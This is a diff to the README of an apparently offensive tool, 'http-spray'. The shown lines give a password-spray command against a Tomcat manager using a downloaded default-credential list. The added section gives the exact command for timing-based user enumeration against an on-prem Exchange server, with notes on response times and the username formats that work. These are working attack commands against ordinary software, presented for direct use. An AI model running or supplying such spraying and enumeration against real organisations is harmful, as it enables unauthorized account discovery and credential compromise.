@@ -17,6 +17,17 @@ curl -LO https://github.com/dadevel/wordlists/raw/main/passwords/tomcat-credenti
 http-spray -t https://app.corp.com/tomcat/manager/html -m basic -C ./tomcat-credentials.txt | tee -a ./http-spray.json | jq -c 'select(.status_code != 401)'
 ~~~
 
+Time-based user enumeration against on-prem Exchange server.
+Requests for valid users take about 0.1s, invalid users take more than 1.5s.
+
+~~~ bash
+http-spray -t https://mail.corp.com/rpc/ -m basic -U ./users.txt -p '' | tee -a ./http-spray.json | jq -c 'select(.time < 0.5)'
+~~~
+
+> **Note:**
+>
+> The user enumeration requires basic authentication and seems to work only with the user formats `corp\jdoe` and `corp.com\jdoe` where `jdoe` is the *samaccountname*.
+
 Spray common service accounts against on-prem Exchange server.
 
 ~~~ bash
